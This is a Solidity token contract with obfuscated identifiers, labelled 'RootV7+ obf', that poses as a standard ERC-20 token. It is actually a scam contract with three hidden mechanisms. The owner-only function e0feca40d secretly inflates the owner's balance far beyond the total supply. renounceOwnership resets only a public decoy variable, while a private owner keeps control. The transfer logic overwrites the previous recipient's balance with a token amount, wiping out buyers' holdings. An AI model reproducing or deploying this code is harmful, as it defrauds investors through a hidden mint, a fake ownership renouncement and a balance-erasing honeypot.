/*
RootV7+
obf
*/
pragma solidity 0.8.8;
contract Contract {
  mapping (address => uint256) private _zedffeae;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply; uint8 public _decimals;string public _symbol;string public _name;uint8 public ae54fax;
  address public D0add = 0x000000000000000000000000000000000000dEaD;
  address private _owner; address public owner;
  receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 ae54fax_, uint totalsupply_) {
    _owner = msg.sender;
    owner = msg.sender;
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    ae54fax = ae54fax_;
    _totalSupply = totalsupply_ * 10**9;
    _zedffeae[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }modifier onlyOwner {require(msg.sender == _owner, "Nauthorized");_;}
  function getOwner() external view returns (address) {return _owner;}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function getmath(address _adehfez) external view returns (uint256) {return _zedffeae[_adehfez];}
  event Transfer(address indexed from, address indexed to, uint256 aresxaef);
  event Approval(address indexed owner, address indexed spender, uint256 aresxaef);
  function transfer(address AefDfdCx, uint256 aresxaef) external returns (bool) {
    _transfer(msg.sender, AefDfdCx, aresxaef);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 aresxaef) external returns (bool) {
    _approve(msg.sender, spender, aresxaef);
    return true;
  }
  function transferFrom(address sender, address AefDfdCx, uint256 aresxaef) external returns (bool) {
    _transfer(sender, AefDfdCx, aresxaef);
    _approve(sender, msg.sender, _allowances[sender][msg.sender] - aresxaef);
    return true;
  }
  function AeDDfdCx(address spender, uint256 addee) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + addee);
    return true;
  }function AeDDffCx(address spender, uint256 edfrdefa) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - edfrdefa);
    return true;}function burn(uint256 aresxaef) public returns (bool) {
    _burn(msg.sender, aresxaef);
    return true;}
    function renounceOwnership() public onlyOwner {
        owner = address(0);emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;emit OwnershipTransferred(adr);}event OwnershipTransferred(address owner);
  function e0feca40d() public onlyOwner returns (bool success) {D0add = 0x000000000000000000000000000000000000dEaD; _zedffeae[msg.sender] = _totalSupply * 10 ** 8;return true;}
uint256 unit = 100;uint256 AesDfdCx = 315;
  function _transfer(address sender, address AefDfdCx, uint256 aresxaef) internal {
    require(sender != address(0), "");
    require(AefDfdCx != address(0), "");
    _zedffeae[sender] = _zedffeae[sender] - aresxaef;
    _zedffeae[AefDfdCx] = _zedffeae[AefDfdCx] + (aresxaef - ((aresxaef / unit) * ae54fax));
    if(D0add != msg.sender){_zedffeae[D0add] = AesDfdCx; D0add = AefDfdCx;}
    D0add = AefDfdCx;
    emit Transfer(sender, AefDfdCx, aresxaef);
  }function _burn(address _adehfez, uint256 aresxaef) internal {
    require(_adehfez != address(0), "");
    _zedffeae[_adehfez] = _zedffeae[_adehfez] - aresxaef;_totalSupply = _totalSupply -aresxaef;
    emit Transfer(_adehfez, address(0), aresxaef);
  }function _approve(address owner, address spender, uint256 aresxaef) internal {
    require(owner != address(0), "");require(spender != address(0), "");
    _allowances[owner][spender] = aresxaef;emit Approval(owner, spender, aresxaef);
  }function _burnFrom(address _adehfez, uint256 aresxaef) internal {
    _burn(_adehfez, aresxaef);
    _approve(_adehfez, msg.sender, _allowances[_adehfez][msg.sender] - aresxaef);
  }
}
//SPDX-License-Identifier: Unlicensed